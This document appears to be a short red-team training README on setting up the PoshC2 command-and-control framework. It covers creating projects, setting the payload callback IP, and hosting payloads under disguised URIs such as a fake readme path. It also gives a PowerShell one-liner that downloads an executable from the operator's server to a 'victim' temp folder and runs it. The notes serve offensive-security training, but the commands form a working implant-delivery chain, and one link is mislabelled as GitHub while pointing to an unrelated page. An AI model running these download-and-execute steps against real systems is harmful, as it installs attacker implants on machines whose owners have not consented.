# CTE-For-Monkeys

- poshc2 
	- set up
	- tool familierization 
		- hosting payload
		- file upload 
		- host enumeration 
		- file download
- living of the land ( windows )
	- file downloads 
	- file (payload) execution 
- powershell 
	- user enumeration 
	- domain enumeratoin 
	- scripting


# Running PoshC2

Create a new project:

```
posh-project -n <project-name>
```

Projects can be switched to or listed using this script:
```
[*] Usage: posh-project -n <new-project-name>
[*] Usage: posh-project -s <project-to-switch-to>
[*] Usage: posh-project -l (lists projects)
[*] Usage: posh-project -d <project-to-delete>
[*] Usage: posh-project -c (shows current project)
```
Edit the configuration for your project:
```
posh-config
```
Edit `payloadcoms` to your ip

Launch the PoshC2 server:
```
posh-server
```

Alternatively start it as a service:
```
posh-service
```
Separately, run the ImplantHandler for interacting with implants:
```
posh -u <username>
```

For more on `Poshc2` github like [here](https://apple.stackexchange.com/questions/254380/why-am-i-getting-an-invalid-active-developer-path-when-attempting-to-use-git-a) 

# Host Payloads 

In the ImplantHandler run file upload command 
```
add-hosted-file
```

Host file opttions 
```
file location > /home/parrot/file.exe
file uri > /en-us/readme.md
file MIME type > text/html
Base64 > y/n
```

View all hosted files by running
```
show-hosted-files
```

# Download Payload on Victim 

For testing lets downloading using powershell on victim machine
```powershell
iwr -uri http://<youripordomian>/hosteduritring -outfile C:\windows\temp\bad.exe && C:\windows\temp\bad.exe
```

Interact with implant by typeing `1` in ImplantHandler

# Host Enumeration 



